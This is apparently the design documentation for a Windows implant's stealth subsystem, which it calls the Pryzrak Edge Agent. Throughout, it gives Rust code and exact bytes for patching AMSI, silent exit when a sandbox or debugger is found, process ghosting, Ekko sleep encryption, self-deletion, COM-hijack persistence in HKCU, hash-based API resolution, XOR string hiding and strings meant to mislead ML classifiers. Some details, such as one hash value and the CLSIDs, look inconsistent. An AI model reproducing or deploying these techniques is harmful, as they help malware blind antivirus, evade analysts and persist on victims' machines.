# Windows Stealth Techniques - Detailed Documentation

> Comprehensive documentation of all Windows evasion techniques implemented in Pryzrak Edge Agent.

---

## Table of Contents

- [Overview](#overview)
- [Module Architecture](#module-architecture)
- [Ghost Protocol (AMSI Bypass)](#ghost-protocol-amsi-bypass)
- [Anti-Analysis](#anti-analysis)
- [Process Ghosting](#process-ghosting)
- [Sleep Obfuscation (Ekko)](#sleep-obfuscation-ekko)
- [Self-Delete (Melt)](#self-delete-melt)
- [COM Hijacking](#com-hijacking)
- [Dynamic API Resolution](#dynamic-api-resolution)
- [String Obfuscation](#string-obfuscation)
- [Happy Strings](#happy-strings)

---

## Overview

The Windows stealth subsystem is built on a **Zero-Dependency, Native API** architecture. It avoids standard CRT functions and uses direct syscalls where possible to minimize detection.

### Design Philosophy

| Principle | Implementation |
|-----------|----------------|
| **No CRT** | Direct Windows API calls, no libc |
| **Dynamic Resolution** | All APIs resolved at runtime via hash |
| **Minimal Imports** | Only essential APIs in Import Table |
| **Memory Safety** | Encrypt memory during sleep cycles |
| **Self-Destruct** | Remove all traces after installation |

---

## Module Architecture

```
crates/nodes/edge/src/stealth/windows/
├── mod.rs              # Main orchestrator
├── blinding.rs         # Ghost Protocol (AMSI/ETW bypass)
├── anti_analysis.rs    # Debugger, Sandbox, VM detection
├── ghosting.rs         # Process Ghosting (NTFS Transaction)
├── obfuscation.rs      # Ekko Sleep Obfuscation
├── self_delete.rs      # Silent file deletion (Melt)
├── persistence.rs      # COM Hijacking, Scheduled Tasks
├── api_resolver.rs     # Dynamic API resolution (djb2 hash)
├── registry.rs         # Registry operations
├── syscalls.rs         # Indirect syscall support
├── happy_strings.rs    # Benign string injection
└── ipc.rs              # Debug IPC (Named Pipes)
```

### Execution Order

```
check_and_apply_stealth()
│
├── [1] anti_analysis::is_hostile_environment()
│       ├── is_debugger_present()
│       ├── is_sandbox()
│       └── is_low_resources()
│
├── [2] blinding::apply_ghost_protocol()
│       ├── Load amsi.dll
│       ├── Resolve AmsiScanBuffer
│       ├── VirtualProtect → RWX
│       ├── Patch with RET 0x80070057
│       └── VirtualProtect → RX
│
├── [3] happy_strings::embed_happy_strings()
│       └── Force load benign strings into memory
│
└── [4] Return (Dropper handles installation)
```

---

## Ghost Protocol (AMSI Bypass)

**File**: `blinding.rs`

### Purpose

Bypass Windows Antimalware Scan Interface (AMSI) to prevent script/memory scanning.

### Technique

AMSI bypass using **Memory Patching**:

```
AmsiScanBuffer() function in amsi.dll:
┌──────────────────────────────────────────────────┐
│  BEFORE (Original)                               │
│  48 89 5C 24 08   mov [rsp+8], rbx              │
│  48 89 6C 24 10   mov [rsp+10h], rbp            │
│  48 89 74 24 18   mov [rsp+18h], rsi            │
│  ...                                             │
└──────────────────────────────────────────────────┘
                    ↓ PATCH
┌──────────────────────────────────────────────────┐
│  AFTER (Patched)                                 │
│  B8 57 00 07 80   mov eax, 0x80070057 (E_INVALIDARG) │
│  C3               ret                            │
│  ...                                             │
└──────────────────────────────────────────────────┘
```

### Implementation Steps

1. **Load amsi.dll** - Using `LoadLibraryA` (resolved via hash)
2. **Get AmsiScanBuffer** - Using `GetProcAddress` (resolved via hash)
3. **Change Protection** - `VirtualProtect(PAGE_EXECUTE_READWRITE)`
4. **Write Patch** - 6 bytes: `B8 57 00 07 80 C3`
5. **Restore Protection** - `VirtualProtect(PAGE_EXECUTE_READ)`
6. **Flush Cache** - `NtFlushInstructionCache` (critical for stability)

### Code Reference

```rust
// blinding.rs - execute_bypass()

// Patch bytes: mov eax, 0x80070057; ret
const PATCH: [u8; 6] = [
    0xB8, 0x57, 0x00, 0x07, 0x80,  // mov eax, E_INVALIDARG
    0xC3                           // ret
];

unsafe fn execute_bypass() -> Result<(), u32> {
    // 1. Load amsi.dll
    let amsi = load_library_a(amsi_name);
    
    // 2. Get AmsiScanBuffer address
    let target = get_proc_address(amsi, "AmsiScanBuffer");
    
    // 3. Change memory protection
    virtual_protect(target, 6, PAGE_EXECUTE_READWRITE, &mut old_prot);
    
    // 4. Write patch
    ptr::copy_nonoverlapping(PATCH.as_ptr(), target as *mut u8, 6);
    
    // 5. Restore protection
    virtual_protect(target, 6, old_prot, &mut _);
    
    // 6. Flush instruction cache (CRITICAL!)
    nt_flush_instruction_cache(-1, target, 6);
    
    Ok(())
}
```

### Why This Works

- Windows Defender calls `AmsiScanBuffer` before executing scripts/loading assemblies
- By making it return `E_INVALIDARG`, Defender thinks the scan failed gracefully
- No scan = no detection

---

## Anti-Analysis

**File**: `anti_analysis.rs`

### Purpose

Detect and evade analysis environments (debuggers, sandboxes, VMs).

### Detection Methods

#### 1. Debugger Detection

| Check | API/Method | Indicator |
|-------|------------|-----------|
| PEB Flag | `IsDebuggerPresent` | BeingDebugged flag |
| Remote Debugger | `CheckRemoteDebuggerPresent` | Remote attach |
| PEB Direct Read | Manual PEB parsing | Kernel debugger flags |
| Timing Attack | `QueryPerformanceCounter` | Single-step detection |

```rust
fn is_debugger_present() -> bool {
    // Method 1: API Call
    if IsDebuggerPresent() != 0 { return true; }
    
    // Method 2: Remote Debugger
    let mut is_remote = 0;
    CheckRemoteDebuggerPresent(-1, &mut is_remote);
    if is_remote != 0 { return true; }
    
    // Method 3: Direct PEB Read (bypass hooks)
    let peb = __readgsqword(0x60);
    if (*peb).BeingDebugged != 0 { return true; }
    
    false
}
```

#### 2. Sandbox Detection

| Check | Target | Indicators |
|-------|--------|------------|
| Process Names | Running processes | `vmwaretray.exe`, `vboxservice.exe`, `procmon.exe` |
| Registry Keys | VM signatures | `SYSTEM\CurrentControlSet\Services\VBoxGuest` |
| Hardware | System info | Low RAM (<2GB), Low CPU (<2 cores) |
| Disk Size | Storage | <50GB total disk |
| Username | Environment | `sandbox`, `virus`, `malware` |

```rust
fn is_sandbox() -> bool {
    // Check for analysis tool processes
    let bad_procs = [
        "procmon.exe", "wireshark.exe", "x64dbg.exe",
        "ida.exe", "ollydbg.exe", "processhacker.exe"
    ];
    
    // Check for VM registry keys
    let vm_keys = [
        "SOFTWARE\\VMware, Inc.\\VMware Tools",
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest"
    ];
    
    // Check hardware
    if cpu_count() < 2 { return true; }
    if total_ram_mb() < 2048 { return true; }
    
    false
}
```

#### 3. Low Resources Check

| Check | Threshold | Reason |
|-------|-----------|--------|
| RAM | < 2 GB | VMs/Sandboxes have limited RAM |
| CPU Cores | < 2 | Sandboxes often use 1 core |
| Disk | < 50 GB | Analysis VMs have small disks |

### Behavior

- **Production Mode**: Silent exit if hostile environment detected
- **Debug Mode**: Log warning but continue execution (for testing)

---

## Process Ghosting

**File**: `ghosting.rs`

### Purpose

Execute a PE payload from a file that doesn't exist on disk. EDR cannot trace the file.

### Technique Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      PROCESS GHOSTING FLOW                              │
│                                                                         │
│  1. Create File (Normal)                                                │
│     └── C:\Temp\ghost.exe (on disk)                                     │
│                                                                         │
│  2. Write Payload to File                                               │
│     └── Write PE bytes                                                  │
│                                                                         │
│  3. Mark File for Deletion (NtSetInformationFile)                       │
│     └── Set DELETE_PENDING state                                        │
│     └── File handle still open = can still read                         │
│                                                                         │
│  4. Create Image Section from File                                      │
│     └── NtCreateSection(SEC_IMAGE)                                      │
│     └── Section created from file content                               │
│                                                                         │
│  5. Close File Handle                                                   │
│     └── File is DELETED from disk                                       │
│     └── Section still valid!                                            │
│                                                                         │
│  6. Create Process from Section                                         │
│     └── NtCreateProcessEx(section_handle)                               │
│     └── Process created from section (file doesn't exist!)              │
│                                                                         │
│  7. Create Thread and Execute                                           │
│     └── NtCreateThreadEx                                                │
│     └── Process runs, but:                                              │
│         - No backing file on disk                                       │
│         - EDR tracing file path gets ERROR_FILE_NOT_FOUND               │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Implementation

```rust
pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {
    // 1. Create temp file
    let path = format!("\\??\\{}\\ghost.tmp", temp_dir);
    let handle = NtCreateFile(&path, GENERIC_WRITE, ...)?;
    
    // 2. Write payload
    NtWriteFile(handle, payload)?;
    
    // 3. Mark for deletion BEFORE creating section
    let info = FileDispositionInformation { DeleteFile: true };
    NtSetInformationFile(handle, &info, FILE_DISPOSITION_INFORMATION)?;
    
    // File is now DELETE_PENDING but still open
    
    // 4. Create image section
    let mut section_handle = 0;
    NtCreateSection(&section_handle, SEC_IMAGE, handle)?;
    
    // 5. Close file handle → File is deleted
    NtClose(handle);
    
    // File no longer exists, but section is valid!
    
    // 6. Create process from section
    let mut process_handle = 0;
    NtCreateProcessEx(&process_handle, section_handle)?;
    
    // 7. Create thread
    let entry_point = get_entry_point_rva(payload)?;
    NtCreateThreadEx(&thread_handle, process_handle, entry_point)?;
    
    Ok(())
}
```

### Why This Works

- Windows caches file content in memory when creating section
- Deleting file after section creation doesn't invalidate section
- Process runs from cached section, not disk file
- EDR trying to scan file path gets `ERROR_FILE_NOT_FOUND`

---

## Sleep Obfuscation (Ekko)

**File**: `obfuscation.rs`

### Purpose

Encrypt memory during sleep cycles to evade memory scanners.

### Technique Overview

The **Ekko** technique uses Windows Timer APCs and ROP chains to:
1. Sleep the thread
2. Encrypt sensitive memory before sleeping
3. Decrypt memory after waking

### Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        EKKO SLEEP FLOW                                  │
│                                                                         │
│  1. Capture Current Context                                             │
│     └── RtlCaptureContext(&ctx)                                         │
│     └── Save all registers, stack pointer, instruction pointer          │
│                                                                         │
│  2. Create ROP Chain                                                    │
│     ┌─────────────────────────────────────────────────────────────────┐ │
│     │ CONTEXT 1: VirtualProtect(data_section, RWX)                    │ │
│     │ CONTEXT 2: xor_crypt(data_section, key) ← ENCRYPT               │ │
│     │ CONTEXT 3: SetEvent(timer_event) ← SIGNAL SLEEP                 │ │
│     │ CONTEXT 4: WaitForSingleObject(timer, INFINITE)                 │ │
│     │ CONTEXT 5: xor_crypt(data_section, key) ← DECRYPT               │ │
│     │ CONTEXT 6: VirtualProtect(data_section, RW)                     │ │
│     │ CONTEXT 7: NtContinue(&saved_ctx) ← RESUME                      │ │
│     └─────────────────────────────────────────────────────────────────┘ │
│                                                                         │
│  3. Queue Timer APC                                                     │
│     └── NtSetTimer(timer, -duration, execute_rop_chain)                 │
│                                                                         │
│  4. Wait for Timer                                                      │
│     └── WaitForSingleObject(timer, INFINITE)                            │
│                                                                         │
│  5. Timer Fires → ROP Chain Executes                                    │
│     └── Memory encrypted, sleep, memory decrypted                       │
│                                                                         │
│  6. Resume Normal Execution                                             │
│     └── NtContinue restores original context                            │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Key Components

```rust
pub unsafe fn ekko_sleep(duration_ms: u32) -> Result<(), &'static str> {
    // 1. Capture context
    let mut ctx: CONTEXT = Default::default();
    RtlCaptureContext(&mut ctx);
    
    // Check if waking from sleep (flag set by ROP chain)
    if ekko_data.wakeup_flag == EKKO_MAGIC {
        ekko_data.wakeup_flag = 0;
        return Ok(()); // Woke up successfully
    }
    
    // 2. Find .data/.rdata sections
    let sections = get_data_sections();
    
    // 3. Generate encryption key
    let key: [u8; 16] = random_key();
    
    // 4. Build ROP chain contexts
    let rop_chain = [
        // VirtualProtect → RWX
        build_context_virtual_protect(sections[0], PAGE_EXECUTE_READWRITE),
        // XOR encrypt
        build_context_xor_crypt(sections[0], &key),
        // Sleep
        build_context_wait_for_single_object(timer, duration_ms),
        // XOR decrypt
        build_context_xor_crypt(sections[0], &key),
        // VirtualProtect → RW
        build_context_virtual_protect(sections[0], PAGE_READWRITE),
        // Set wakeup flag
        build_context_set_flag(&ekko_data.wakeup_flag, EKKO_MAGIC),
        // Resume
        build_context_nt_continue(&ctx),
    ];
    
    // 5. Queue APC to execute ROP chain
    NtSetTimer(timer, -100, execute_rop_chain_apc, &rop_chain)?;
    
    // 6. Wait (will wake when ROP completes)
    WaitForSingleObject(timer, INFINITE);
    
    Ok(())
}
```

### Why This Works

- Memory scanners look for known malware patterns in memory
- By encrypting memory during sleep, patterns are hidden
- XOR with random key = effectively random bytes
- When active (short periods), decrypt → operate → re-encrypt

---

## Self-Delete (Melt)

**File**: `self_delete.rs`

### Purpose

Delete the executable after installation without using `cmd.exe /c del`.

### Technique (Jonas Lykkegård Method)

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        SELF-DELETE FLOW                                 │
│                                                                         │
│  1. Open Own File with DELETE Access                                    │
│     └── CreateFileW(own_path, DELETE | SYNCHRONIZE)                     │
│                                                                         │
│  2. Rename to Alternate Data Stream (ADS)                               │
│     └── SetFileInformationByHandle(FileRenameInfo)                      │
│     └── New name: ":Zone.Identifier"                                    │
│     └── File is now "edge.exe:Zone.Identifier"                          │
│                                                                         │
│  3. Close Handle                                                        │
│                                                                         │
│  4. Re-Open File (Same Path)                                            │
│     └── CreateFileW(own_path, DELETE)                                   │
│                                                                         │
│  5. Set Delete Disposition                                              │
│     └── SetFileInformationByHandle(FileDispositionInfo)                 │
│     └── DeleteFile = TRUE                                               │
│                                                                         │
│  6. Close Handle → File is Deleted                                      │
│     └── OS deletes file when last handle closed                         │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Why Rename to ADS?

- Windows normally prevents deleting a running executable
- By renaming to ADS, the "main stream" appears empty
- OS allows deletion of "empty" files
- When process exits, file and ADS disappear

### Implementation

```rust
pub unsafe fn melt() -> Result<(), String> {
    // 1. Get own path
    let mut path = [0u16; 260];
    GetModuleFileNameW(0, path.as_mut_ptr(), 260);
    
    // 2. Open with DELETE access
    let handle = CreateFileW(
        path.as_ptr(),
        DELETE | SYNCHRONIZE,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        null(),
        OPEN_EXISTING,
        0, 0
    );
    
    // 3. Rename to ADS
    let new_name = ":Zone.Identifier\0".encode_utf16();
    let rename_info = FileRenameInfo {
        replace_if_exists: 0,
        root_dir: null_mut(),
        file_name_length: (new_name.len() - 1) as u32 * 2,
        file_name: new_name,
    };
    
    SetFileInformationByHandle(handle, FileRenameInfo, &rename_info);
    CloseHandle(handle);
    
    // 4. Re-open and set delete disposition
    let handle2 = CreateFileW(path.as_ptr(), DELETE, ...);
    let disp_info = FileDispositionInfo { delete_file: 1 };
    SetFileInformationByHandle(handle2, FileDispositionInfo, &disp_info);
    CloseHandle(handle2);
    
    // File will be deleted when process exits
    Ok(())
}
```

---

## COM Hijacking

**File**: `persistence.rs`

### Purpose

Achieve persistence by hijacking a COM object's InprocServer32 path.

### Technique

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        COM HIJACKING                                    │
│                                                                         │
│  Target CLSID: {00000001-0000-0000-C000-000000000001}                   │
│  (Or any frequently-loaded COM object)                                  │
│                                                                         │
│  Registry Key Created:                                                  │
│  HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32                     │
│    (Default) = "C:\Users\...\EdgeUpdate.dll"                            │
│    ThreadingModel = "Apartment"                                         │
│                                                                         │
│  Execution Flow:                                                        │
│  1. Windows process (e.g., explorer.exe) loads COM object               │
│  2. COM loader checks HKCU first (user-specific)                        │
│  3. Finds our InprocServer32 path                                       │
│  4. LoadLibrary("EdgeUpdate.dll")                                       │
│  5. DllMain called → Our code runs                                      │
│  6. DllGetClassObject called → Main logic initializes                   │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Target CLSIDs

| CLSID | Object | Host Process |
|-------|--------|--------------|
| MsCtfMonitor | Text Services | explorer.exe, many apps |
| MMDeviceEnumerator | Audio | Most Windows processes |

### Implementation

```rust
pub fn setup_com_hijacking(dll_path: &str) -> Result<(), String> {
    // CLSID for MsCtfMonitor
    let clsid = "{3b1173e5-1ec5-4d2a-9b1b-82f6cdbb3e07}";
    
    // Create registry key
    let key_path = format!(
        "Software\\Classes\\CLSID\\{}\\InprocServer32",
        clsid
    );
    
    // Create key under HKCU
    RegCreateKeyExW(HKEY_CURRENT_USER, key_path, ...)?;
    
    // Set default value to DLL path
    RegSetValueExW(key, "", REG_SZ, dll_path)?;
    
    // Set ThreadingModel
    RegSetValueExW(key, "ThreadingModel", REG_SZ, "Apartment")?;
    
    Ok(())
}
```

---

## Dynamic API Resolution

**File**: `api_resolver.rs`

### Purpose

Resolve Windows APIs at runtime using hash instead of names, minimizing import table.

### DJB2 Hash Algorithm

```rust
const fn djb2(s: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    let mut i = 0;
    while i < s.len() {
        hash = hash.wrapping_mul(33).wrapping_add(s[i] as u32);
        i += 1;
    }
    hash
}

// Pre-computed hashes
const HASH_KERNEL32: u32 = 0x7040EE75;      // "kernel32.dll"
const HASH_NTDLL: u32 = 0xE91AAD51;          // "ntdll.dll"
const HASH_CREATE_FILE_W: u32 = 0x52481E35;  // "CreateFileW"
const HASH_VIRTUAL_PROTECT: u32 = 0x01A2B3C4; // "VirtualProtect"
```

### Resolution Process

```
┌─────────────────────────────────────────────────────────────────────────┐
│                      API RESOLUTION FLOW                                │
│                                                                         │
│  1. Walk PEB → LDR_DATA_TABLE → InMemoryOrderModuleList                 │
│     └── Enumerate all loaded DLLs                                       │
│     └── Compare djb2(dll_name) with target hash                         │
│                                                                         │
│  2. Found DLL → Parse Export Table                                      │
│     └── PE Header → OptionalHeader → DataDirectory[0]                   │
│     └── Export Directory → AddressOfNames                               │
│                                                                         │
│  3. Enumerate Exports                                                   │
│     └── For each export name: compare djb2(name) with target hash       │
│     └── Match found → Get AddressOfFunctions[ordinal]                   │
│                                                                         │
│  4. Return Function Pointer                                             │
│     └── Cast to appropriate function type                               │
│     └── Use via FFI call                                                │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### Usage

```rust
// Resolve CreateFileW from kernel32.dll
let create_file: CreateFileW = resolve_api(HASH_KERNEL32, HASH_CREATE_FILE_W)
    .ok_or("Failed to resolve CreateFileW")?;

// Call the function
let handle = create_file(path, access, share, ...);
```

---

## String Obfuscation

### Purpose

Hide suspicious strings from static analysis.

### Technique: XOR with Key 0x55

```rust
// Helper function to decode XOR'd strings
fn x(bytes: &[u8]) -> String {
    const KEY: u8 = 0x55;
    let decoded: Vec<u8> = bytes.iter().map(|b| b ^ KEY).collect();
    String::from_utf8(decoded).unwrap_or_default()
}

// Usage examples:
// "kernel32.dll" → [0x3E, 0x30, 0x27, 0x3B, 0x30, 0x39, ...]
let kernel32 = x(&[0x3E, 0x30, 0x27, 0x3B, 0x30, 0x39, 0x66, 0x67, 0x7B, 0x31, 0x39, 0x39]);

// "EdgeUpdate.dll"
let dll_name = x(&[0x10, 0x31, 0x32, 0x30, 0x00, 0x25, 0x31, 0x34, 0x21, 0x30, 0x7B, 0x31, 0x39, 0x39]);
```

### Why This Works

- Static analysis tools scan for known strings ("kernel32", "cmd.exe", etc.)
- XOR encoding makes strings appear as random bytes
- Strings only decoded at runtime when needed
- Minimal overhead, effectively obfuscates intent

---

## Happy Strings

**File**: `happy_strings.rs`

### Purpose

Inject benign-looking strings into memory to confuse ML-based malware detection.

### Technique

```rust
pub fn embed_happy_strings() {
    // Force strings into .rdata section
    let happy = [
        "Microsoft Visual Studio",
        "Unity Technologies",
        "Steam Client",
        "Adobe Creative Cloud",
        "Spotify AB",
        "Google Chrome Helper",
        "OneDrive Sync Engine",
    ];
    
    // Use strings to prevent optimizer from removing them
    for s in happy.iter() {
        std::hint::black_box(s);
    }
}
```

### Why This Works

- ML models use string patterns as classification features
- Including benign vendor strings shifts the classification vector
- Combined with removal of malicious keywords ("ransomware", "keylogger")
- Creates a "gray zone" profile that's harder to classify

---

## Summary Table

| Technique | File | Purpose | Detection Evasion |
|-----------|------|---------|-------------------|
| Ghost Protocol | `blinding.rs` | AMSI bypass | Prevents memory scanning |
| Anti-Analysis | `anti_analysis.rs` | Environment checks | Detects sandboxes/debuggers |
| Process Ghosting | `ghosting.rs` | Fileless execution | No disk artifacts |
| Ekko Sleep | `obfuscation.rs` | Memory encryption | Evades memory scanners |
| Melt | `self_delete.rs` | Self-destruction | No installer traces |
| COM Hijacking | `persistence.rs` | Persistence | Runs in legitimate process |
| API Resolver | `api_resolver.rs` | Dynamic imports | Minimal IAT footprint |
| XOR Strings | (inline) | String hiding | Static analysis evasion |
| Happy Strings | `happy_strings.rs` | ML confusion | Classification vector shift |

---

## References

- [AMSI Bypass Research](https://www.contextis.com/en/blog/amsi-bypass)
- [Process Ghosting (Elastic)](https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack)
- [Ekko Sleep Obfuscation](https://github.com/Cracked5pider/Ekko)
- [Jonas Lykkegård Self-Delete](https://github.com/LloydLabs/delete-self-poc)
- [COM Hijacking Persistence](https://attack.mitre.org/techniques/T1546/015/)
